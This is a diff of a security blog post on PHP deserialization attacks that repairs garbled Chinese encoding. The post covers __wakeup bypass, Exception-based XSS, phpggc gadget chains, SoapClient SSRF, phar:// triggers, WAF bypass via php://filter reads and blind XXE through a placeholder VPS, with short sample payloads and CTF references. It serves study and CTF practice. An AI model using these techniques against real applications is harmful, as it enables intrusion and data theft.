@@ -17,18 +17,18 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>��½�����SQLע�� | ZenisLTZ&#39;s Blog</title>
+  <title>PHP Deserialization | ZenisLTZ&#39;s Blog</title>
   <meta name="description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
 <meta name="keywords" content="php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="��½�����SQLע��">
+<meta property="og:title" content="PHP Deserialization">
 <meta property="og:url" content="http://ZenisLTZ.github.io/2018/12/09/Deserialize/index.html">
 <meta property="og:site_name" content="ZenisLTZ">
 <meta property="og:description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-08T19:26:23.717Z">
+<meta property="og:updated_time" content="2018-12-08T19:32:04.594Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="��½�����SQLע��">
+<meta name="twitter:title" content="PHP Deserialization">
 <meta name="twitter:description" content="PHP Deserialization1.PHP Serialization Basic123456789101112a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - u">
   <!-- Canonical links -->
   <link rel="canonical" href="http://ZenisLTZ.github.io/2018/12/09/Deserialize/index.html">
@@ -252,7 +252,7 @@
                 
               </p>
               <p class="item-title">
-                <a href="/2018/12/09/PHP tricks/" class="title">��½�����SQLע��</a>
+                <a href="/2018/12/09/PHP tricks/" class="title">PHP tricks</a>
               </p>
               <p class="item-date">
                 <time datetime="2018-12-08T19:25:28.756Z" itemprop="datePublished">2018-12-09</time>
@@ -267,7 +267,7 @@
                 
               </p>
               <p class="item-title">
-                <a href="/2018/12/09/Deserialize/" class="title">��½�����SQLע��</a>
+                <a href="/2018/12/09/Deserialize/" class="title">PHP Deserialization</a>
               </p>
               <p class="item-date">
                 <time datetime="2018-12-08T19:24:48.964Z" itemprop="datePublished">2018-12-09</time>
@@ -340,7 +340,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ��½�����SQLע��
+      PHP Deserialization
     </h1>
   
 
@@ -370,29 +370,29 @@
       
         <h1 id="PHP-Deserialization"><a href="#PHP-Deserialization" class="headerlink" title="PHP Deserialization"></a>PHP Deserialization</h1><h2 id="1-PHP-Serialization-Basic"><a href="#1-PHP-Serialization-Basic" class="headerlink" title="1.PHP Serialization Basic"></a>1.PHP Serialization Basic</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
 <ul>
-<li>public����:        ֱ�ӱ�����</li>
-<li>private����:         \x00 + ���� + \x00 + ������ </li>
-<li>protected����:    \x00 + * + \x00 + ������</li>
+<li>public变量:        直接变量名</li>
+<li>private变量:         \x00 + 类名 + \x00 + 变量名 </li>
+<li>protected变量:    \x00 + * + \x00 + 变量名</li>
 </ul>
-<h3 id="��Щ�಻һ���ܹ����У��������л�-V5-3"><a href="#��Щ�಻һ���ܹ����У��������л�-V5-3" class="headerlink" title="��Щ�಻һ���ܹ����У��������л�(V5.3+)"></a>��Щ�಻һ���ܹ����У��������л�(V5.3+)</h3><p>��SimpleXMLElement</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#PHP/ext/simplexml/simplexml.c</span><br><span class="line">sxe_class_entry-&gt;serialize = zend_class_serialize_deny;		//���ܱ����л�</span><br><span class="line">sxe_class_entry-&gt;unserialize = zend_class_unserialize_deny;	//���ܱ������л�</span><br></pre></td></tr></table></figure>
-<h3 id="����˼·"><a href="#����˼·" class="headerlink" title="����˼·"></a>����˼·</h3><p>��ͬ��ħ�����������˲�ͬ�����÷�ʽ��ͨ������ĳһ������payload���෴���л���������ܴ�����ħ�������ĺ�����ͨ���ǿ���������֮��ģ�������<code>__wakeup/__destruct</code>���౻�����л�֮�󡱿϶����ᱻִ��(�ƹ�<code>__wakeup</code>�ķ�������)�������Ķ��д�����ʽ�������ܽ�ĺܶ���</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__wakeup/__destruct		�����л�ʱֱ��ִ��</span><br><span class="line">__call					�������δ�����ķ�����Soapclient��</span><br><span class="line">__toString				��ӡһ�������ʱ������,���ڴ�ӡ�ĺ���������</span><br><span class="line">*__construct		���캯������ʵ�ܵ���������������Բ���Ϊ�����л�©�����˻����Ͽ�����ֱ�ӵ���һ����</span><br></pre></td></tr></table></figure>
-<h2 id="2-Technique"><a href="#2-Technique" class="headerlink" title="2.Technique"></a>2.Technique</h2><h3 id="2-1-�ƹ�-wakeup����"><a href="#2-1-�ƹ�-wakeup����" class="headerlink" title="2.1 �ƹ�__wakeup����"></a>2.1 �ƹ�__wakeup����</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
+<h3 id="有些类不一定能够进行（反）序列化-V5-3"><a href="#有些类不一定能够进行（反）序列化-V5-3" class="headerlink" title="有些类不一定能够进行（反）序列化(V5.3+)"></a>有些类不一定能够进行（反）序列化(V5.3+)</h3><p>如SimpleXMLElement</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#PHP/ext/simplexml/simplexml.c</span><br><span class="line">sxe_class_entry-&gt;serialize = zend_class_serialize_deny;		//不能被序列化</span><br><span class="line">sxe_class_entry-&gt;unserialize = zend_class_unserialize_deny;	//不能被反序列化</span><br></pre></td></tr></table></figure>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>不同的魔术方法决定了不同的利用方式，通常是在某一个传入payload的类反序列化后调用了能触发其魔法方法的函数（通常是开发者意料之外的），除了<code>__wakeup/__destruct</code>在类被反序列化之后”肯定”会被执行(绕过<code>__wakeup</code>的方法见下)，其他的都有触发方式，网上总结的很多了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__wakeup/__destruct		反序列化时直接执行</span><br><span class="line">__call					类调用了未声明的方法（Soapclient）</span><br><span class="line">__toString				打印一个对象的时被调用,用于打印的函数见下文</span><br><span class="line">*__construct		构造函数，其实能调用这个函数，可以不作为反序列化漏洞看了基本上可以算直接调用一个类</span><br></pre></td></tr></table></figure>
+<h2 id="2-Technique"><a href="#2-Technique" class="headerlink" title="2.Technique"></a>2.Technique</h2><h3 id="2-1-绕过-wakeup方法"><a href="#2-1-绕过-wakeup方法" class="headerlink" title="2.1 绕过__wakeup方法"></a>2.1 绕过__wakeup方法</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
 <p><a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a></p>
-<p>CVE-2016-7124  ����Ա������Ŀ����ʵ����Ŀʱ���ƹ�</p>
-<h3 id="2-2-toString���������÷�ʽ"><a href="#2-2-toString���������÷�ʽ" class="headerlink" title="2.2 __toString���������÷�ʽ"></a>2.2 __toString���������÷�ʽ</h3><h4 id="2-2-1-������ʽ"><a href="#2-2-1-������ʽ" class="headerlink" title="2.2.1 ������ʽ"></a>2.2.1 ������ʽ</h4><p>��phar�ļ����������л��ķ������ƣ����к��ļ������йصĺ���</p>
+<p>CVE-2016-7124  当成员属性数目大于实际数目时可绕过</p>
+<h3 id="2-2-toString方法的利用方式"><a href="#2-2-toString方法的利用方式" class="headerlink" title="2.2 __toString方法的利用方式"></a>2.2 __toString方法的利用方式</h3><h4 id="2-2-1-触发方式"><a href="#2-2-1-触发方式" class="headerlink" title="2.2.1 触发方式"></a>2.2.1 触发方式</h4><p>与phar文件触发反序列化的方法相似，都有和文件操作有关的函数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo </span><br><span class="line">getimagesize</span><br><span class="line">touch</span><br><span class="line">file_get_contents ...</span><br></pre></td></tr></table></figure>
-<h4 id="2-2-2-ʵ��XSS�����o���"><a href="#2-2-2-ʵ��XSS�����o���" class="headerlink" title="2.2.2 ʵ��XSS�����õ���:"></a>2.2.2 ʵ��XSS�����õ���:</h4><p><a href="https://www.freebuf.com/vuls/80293.html" target="_blank" rel="noopener">ͨ��PHP�����л�����Զ�̴���ִ��</a></p>
+<h4 id="2-2-2-实现XSS可利用的类"><a href="#2-2-2-实现XSS可利用的类" class="headerlink" title="2.2.2 实现XSS可利用的类:"></a>2.2.2 实现XSS可利用的类:</h4><p><a href="https://www.freebuf.com/vuls/80293.html" target="_blank" rel="noopener">通过PHP反序列化进行远程代码执行</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Exception::__toString</span><br><span class="line">ErrorException::__toString</span><br><span class="line">DateTime::__wakeup</span><br><span class="line">ReflectionException::__toString</span><br><span class="line">ReflectionFunctionAbstract::__toString</span><br><span class="line">ReflectionFunction::__toString</span><br><span class="line">ReflectionParameter::__toString</span><br><span class="line">ReflectionMethod::__toString</span><br><span class="line">ReflectionClass::__toString</span><br><span class="line">ReflectionObject::__toString</span><br><span class="line">ReflectionProperty::__toString</span><br><span class="line">ReflectionExtension::__toString</span><br><span class="line">LogicException::__toString</span><br><span class="line">BadFunctionCallException::__toString</span><br><span class="line">BadMethodCallException::__toString</span><br><span class="line">DomainException::__toString</span><br><span class="line">InvalidArgumentException::__toString</span><br><span class="line">LengthException::__toString</span><br><span class="line">OutOfRangeException::__toString</span><br><span class="line">RuntimeException::__toStrings</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); (PHP 7+)</span><br><span class="line">$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);</span><br><span class="line">echo unserialize(serialize($a));</span><br><span class="line">file_get_contents(unserialize(serialize($a)));</span><br></pre></td></tr></table></figure>
-<h3 id="2-3-Composer�еL��"><a href="#2-3-Composer�еL��" class="headerlink" title="2.3 Composer�еĿ��"></a>2.3 Composer�еĿ��</h3><p>phpggc������������payload</p>
+<h3 id="2-3-Composer中的框架"><a href="#2-3-Composer中的框架" class="headerlink" title="2.3 Composer中的框架"></a>2.3 Composer中的框架</h3><p>phpggc可以用来构造payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpggc -l</span><br></pre></td></tr></table></figure>
-<h4 id="2-3-1-���ڷ����л�©���I�"><a href="#2-3-1-���ڷ����л�©���I�" class="headerlink" title="2.3.1 ���ڷ����л�©���İ�"></a>2.3.1 ���ڷ����л�©���İ�</h4><ul>
+<h4 id="2-3-1-存在反序列化漏洞的包"><a href="#2-3-1-存在反序列化漏洞的包" class="headerlink" title="2.3.1 存在反序列化漏洞的包"></a>2.3.1 存在反序列化漏洞的包</h4><ul>
 <li>cartalyst/sentry(5.3+)</li>
 <li>cartalyst/sentinel(5.4+)</li>
 </ul>
-<h4 id="2-3-2-һЩ���Թ���POP-chain�I�"><a href="#2-3-2-һЩ���Թ���POP-chain�I�" class="headerlink" title="2.3.2 һЩ���Թ���POP chain�İ�"></a>2.3.2 һЩ���Թ���POP chain�İ�</h4><ul>
+<h4 id="2-3-2-一些可以构造POP-chain的包"><a href="#2-3-2-一些可以构造POP-chain的包" class="headerlink" title="2.3.2 一些可以构造POP chain的包"></a>2.3.2 一些可以构造POP chain的包</h4><ul>
 <li><p>Arbitrary Write:</p>
 <ul>
 <li><p>monolog/monolog (&lt;1.11.0)</p>
@@ -402,39 +402,39 @@
 </ul>
 </li>
 </ul>
-<h5 id="2018-��̱�-Babyt2"><a href="#2018-��̱�-Babyt2" class="headerlink" title="2018 ��̱�  Babyt2"></a>2018 ��̱�  Babyt2</h5><ul>
+<h5 id="2018-鹏程杯-Babyt2"><a href="#2018-鹏程杯-Babyt2" class="headerlink" title="2018 鹏程杯  Babyt2"></a>2018 鹏程杯  Babyt2</h5><ul>
 <li><p>Arbitrary Delete:</p>
 <ul>
 <li>swiftmailer/swiftmailer</li>
 </ul>
 </li>
 </ul>
-<h3 id="2-4-SoapClient���SSRF"><a href="#2-4-SoapClient���SSRF" class="headerlink" title="2.4 SoapClient���SSRF"></a>2.4 SoapClient���SSRF</h3><p>extension=php_soap<br>SoapClient�ڷ�wsdlģʽ�·����л����Է����������SSRF+CRLF���ں����İ汾�з����л�����ֱ�ӷ������ӣ���������ֱ�ӵ���һ�������ڵ��෽��(��Ϊ�ײ������__call����),�����ᷢ��Header��SOAPAction����Ϊ<code>&lt;uri&gt;#&lt;���õķ�����&gt;</code></p>
-<p>user-agentͷ��������CRLF,�Ӷ������޸�Content-TypeΪmultipart/form-data������POST����,���demo</p>
+<h3 id="2-4-SoapClient造成SSRF"><a href="#2-4-SoapClient造成SSRF" class="headerlink" title="2.4 SoapClient造成SSRF"></a>2.4 SoapClient造成SSRF</h3><p>extension=php_soap<br>SoapClient在非wsdl模式下反序列化可以发起请求造成SSRF+CRLF，在后来的版本中反序列化不能直接发起链接，不过可以直接调用一个不存在的类方法(因为底层调用了__call方法),方法会发到Header的SOAPAction内容为<code>&lt;uri&gt;#&lt;调用的方法名&gt;</code></p>
+<p>user-agent头还可以有CRLF,从而可以修改Content-Type为multipart/form-data等来传POST参数,详见demo</p>
 <ul>
 <li><p>N1CTF easy_harder_php</p>
 <p>Deserialzation+CRLF+SSRF</p>
 </li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a = new SoapClient(null, array(&apos;location&apos; =&gt; &quot;http://127.0.0.1:1234&quot;,&apos;uri&apos; =&gt; &quot;123&quot;));</span><br><span class="line">	$a-&gt;a();</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: PHP-SOAP/7.2.12</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;123#a&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="2-5-PHP-Session�����л�"><a href="#2-5-PHP-Session�����л�" class="headerlink" title="2.5 PHP Session�����л�"></a>2.5 PHP Session�����л�</h3><p>��PHP Session Security����</p>
-<h3 id="2-6-phar�l������л�"><a href="#2-6-phar�l������л�" class="headerlink" title="2.6 phar�ļ������л�"></a>2.6 phar�ļ������л�</h3><p>���©���ĳ��ָı��˷����л�©����ͳ�����÷�ʽ������Ҫunserialize(),ֻ��Ҫuri����phar�ļ����ɣ�����������˹����棨ʲôʱ����Orange����PHPԴ��϶��������棩</p>
-<h4 id="2-6-1-��������"><a href="#2-6-1-��������" class="headerlink" title="2.6.1 ��������"></a>2.6.1 ��������</h4><ol>
-<li>phar�ļ�Ҫ�ܹ��ϴ����������ˡ�</li>
-<li>Ҫ�п��õ�ħ��������Ϊ�����塱��</li>
-<li>�ļ����������Ĳ����ɿأ��� phar:// �������ַ�û�б�����</li>
+<h3 id="2-5-PHP-Session反序列化"><a href="#2-5-PHP-Session反序列化" class="headerlink" title="2.5 PHP Session反序列化"></a>2.5 PHP Session反序列化</h3><p>见PHP Session Security文章</p>
+<h3 id="2-6-phar文件反序列化"><a href="#2-6-phar文件反序列化" class="headerlink" title="2.6 phar文件反序列化"></a>2.6 phar文件反序列化</h3><p>这个漏洞的出现改变了反序列化漏洞传统的利用方式，不需要unserialize(),只需要uri访问phar文件即可，极大的增大了攻击面（什么时候像Orange翻翻PHP源码肯定大有裨益）</p>
+<h4 id="2-6-1-利用条件"><a href="#2-6-1-利用条件" class="headerlink" title="2.6.1 利用条件"></a>2.6.1 利用条件</h4><ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且 phar:// 等特殊字符没有被过滤</li>
 </ol>
-<p>ʹ��phar://Э���ȡ�ļ���ʱ���ļ����ݻᱻ������phar����Ȼ��phar�����ڵ�Metadata��Ϣ�ᱻ�����л�</p>
-<p>�����phar����ʵ�������ļ�����:</p>
-<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar��Stream Wrapper���PHP RCE�������ھ�</a></p>
-<p>��Ҫ��Ҫ�ҳ���php_stream_open_wrapper�ĺ���</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms / filesize</span><br><span class="line">file / file_get_contents / readfile / fopen</span><br><span class="line">file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">include</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink / copy / touch</span><br><span class="line"></span><br><span class="line"># exif:	exif_thumbnail/exif_imagetype</span><br><span class="line"># gd:	imageloadfont/imagecreatefrom***</span><br><span class="line"># file/url:	get_meta_tags / get_headers</span><br><span class="line"># Hash:	hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file</span><br><span class="line"># standard: getimagesize / getimagesizefromstring</span><br><span class="line"># others:</span><br><span class="line">SimpleXmlElement::__construct($url, LIBXML_NONET, true)	//LIBXML_NONET��Ӱ��phar wrapper</span><br><span class="line">PDO::pgsqlCopyFromFile(string $table_name , string $filename,...)	//$filename����phar wrapper</span><br><span class="line">ZipArchive::extractTo ( string $destination,...)</span><br><span class="line">mysqli_query��sql����У� LOAD DATA LOCAL INFILE</span><br></pre></td></tr></table></figure>
+<p>使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化</p>
+<p>会造成phar对象实例化的文件操作:</p>
+<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></p>
+<p>主要是要找出发php_stream_open_wrapper的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fileatime / filectime / filemtime</span><br><span class="line">stat / fileinode / fileowner / filegroup / fileperms / filesize</span><br><span class="line">file / file_get_contents / readfile / fopen</span><br><span class="line">file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</span><br><span class="line">include</span><br><span class="line">parse_ini_file</span><br><span class="line">unlink / copy / touch</span><br><span class="line"></span><br><span class="line"># exif:	exif_thumbnail/exif_imagetype</span><br><span class="line"># gd:	imageloadfont/imagecreatefrom***</span><br><span class="line"># file/url:	get_meta_tags / get_headers</span><br><span class="line"># Hash:	hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file</span><br><span class="line"># standard: getimagesize / getimagesizefromstring</span><br><span class="line"># others:</span><br><span class="line">SimpleXmlElement::__construct($url, LIBXML_NONET, true)	//LIBXML_NONET不影响phar wrapper</span><br><span class="line">PDO::pgsqlCopyFromFile(string $table_name , string $filename,...)	//$filename传入phar wrapper</span><br><span class="line">ZipArchive::extractTo ( string $destination,...)</span><br><span class="line">mysqli_query的sql语句中： LOAD DATA LOCAL INFILE</span><br></pre></td></tr></table></figure>
 <h4 id="2-6-2-Bypass-Waf"><a href="#2-6-2-Bypass-Waf" class="headerlink" title="2.6.2 Bypass Waf"></a>2.6.2 Bypass Waf</h4><ul>
-<li>phpαЭ�鲻���ִ�Сд</li>
+<li>php伪协议不区分大小写</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readfile(&quot;PHP://FILTER/convert.BASE64-ENCODE/resource=/etc/hostname&quot;);</span><br><span class="line">readfile(&quot;FILE:///etc/hostname&quot;);</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>compress.zlib://������Э��</p>
+<li><p>compress.zlib://等其他协议</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar:///var/www/html</span><br><span class="line">compress.bzip2://phar:///</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
@@ -444,9 +444,9 @@
 <li>WordPress(20170228)</li>
 <li>Contao TCPDF(20180524)</li>
 </ul>
-<h3 id="2-7-construct�������ʵ����"><a href="#2-7-construct�������ʵ����" class="headerlink" title="2.7 __construct�������ʵ����"></a>2.7 <code>__construct</code>�������ʵ����</h3><p>���൱�������е���ĳ���Ѿ��������࣬ �Ѿ��������������get_declared_classes()�����鿴</p>
-<h4 id="2-7-1-ReflectionClass-�������Զ������"><a href="#2-7-1-ReflectionClass-�������Զ������" class="headerlink" title="2.7.1 ReflectionClass �������Զ������"></a>2.7.1 ReflectionClass �������Զ������</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function createInstanceFromNamedArguments($className, $arguments)&#123;</span><br><span class="line">       $reflectionClass = new \ReflectionClass($className);</span><br><span class="line">       $constructorParams =$reflectionClass-&gt;getConstructor()-&gt;getParameters();</span><br><span class="line">       return $reflectionClass-&gt;newInstanceArgs($arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="2-7-2-SimpleXMLElementʵ��XXE"><a href="#2-7-2-SimpleXMLElementʵ��XXE" class="headerlink" title="2.7.2 SimpleXMLElementʵ��XXE"></a>2.7.2 SimpleXMLElementʵ��XXE</h4><p><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">��PHP����ʵ������Blind XXE</a></p>
+<h3 id="2-7-construct任意对象实例化"><a href="#2-7-construct任意对象实例化" class="headerlink" title="2.7 __construct任意对象实例化"></a>2.7 <code>__construct</code>任意对象实例化</h3><p>就相当于能自行调用某个已经声明的类， 已经声明的类可以用get_declared_classes()函数查看</p>
+<h4 id="2-7-1-ReflectionClass-来调用自定义的类"><a href="#2-7-1-ReflectionClass-来调用自定义的类" class="headerlink" title="2.7.1 ReflectionClass 来调用自定义的类"></a>2.7.1 ReflectionClass 来调用自定义的类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function createInstanceFromNamedArguments($className, $arguments)&#123;</span><br><span class="line">       $reflectionClass = new \ReflectionClass($className);</span><br><span class="line">       $constructorParams =$reflectionClass-&gt;getConstructor()-&gt;getParameters();</span><br><span class="line">       return $reflectionClass-&gt;newInstanceArgs($arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-7-2-SimpleXMLElement实现XXE"><a href="#2-7-2-SimpleXMLElement实现XXE" class="headerlink" title="2.7.2 SimpleXMLElement实现XXE"></a>2.7.2 SimpleXMLElement实现XXE</h4><p><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">从PHP对象实例化到Blind XXE</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement(&quot;http://&lt;vps/xxe.xml&gt;&quot;, LIBXML_NONE, true)</span><br></pre></td></tr></table></figure>
 <ul>
 <li>SUCTF2018 WEB homework</li>
@@ -460,23 +460,23 @@
 </li>
 <li><p>CVE-2016-7124</p>
 </li>
-<li><p>CVE-2017-6920 Drupal Yaml�����л�©��</p>
-<p> <a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">��PHPGGC���PHP�����л�©��</a></p>
+<li><p>CVE-2017-6920 Drupal Yaml反序列化漏洞</p>
+<p> <a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由PHPGGC理解PHP反序列化漏洞</a></p>
 </li>
 </ul>
 <ul>
-<li><p>Typecho�����л�</p>
+<li><p>Typecho反序列化</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install.php---&gt;Db-&gt;__toString------&gt;Feed-&gt;__get----&gt;_applyFilter</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>MWR Labs<br>  Laravel -&gt; Cookie Forgery -&gt; Decryption -&gt; RCE </p>
 </li>
 </ul>
 <h2 id="4-Links"><a href="#4-Links" class="headerlink" title="4. Links"></a>4. Links</h2><ul>
-<li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">�����л�֮PHPԭ���������</a></li>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">反序列化之PHP原生类的利用</a></li>
 <li><a href="https://prezi.com/67dwboesxevo/copy-of-php-object-injection-revisited/" target="_blank" rel="noopener">Copy of PHP Object Injection Revisited</a></li>
-<li><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">��HITCON 2016һ��web��һ��php�����л�©��</a></li>
-<li><a href="https://www.secpulse.com/archives/74827.html" target="_blank" rel="noopener">blackhat�������� | phar�����л�</a></li>
-<li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">���� phar ��չ php �����л�©��������</a></li>
+<li><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">由HITCON 2016一道web聊一聊php反序列化漏洞</a></li>
+<li><a href="https://www.secpulse.com/archives/74827.html" target="_blank" rel="noopener">blackhat议题深入 | phar反序列化</a></li>
+<li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></li>
 </ul>
 
       
@@ -487,7 +487,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ZenisLTZ.github.io/2018/12/09/Deserialize/" title="��½�����SQLע��" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/12/09/Deserialize/</a>
+      <a href="http://ZenisLTZ.github.io/2018/12/09/Deserialize/" title="PHP Deserialization" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/12/09/Deserialize/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -534,7 +534,7 @@
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2018/12/09/PHP tricks/" title="��½�����SQLע��"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+      <a href="/2018/12/09/PHP tricks/" title="PHP tricks"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
     
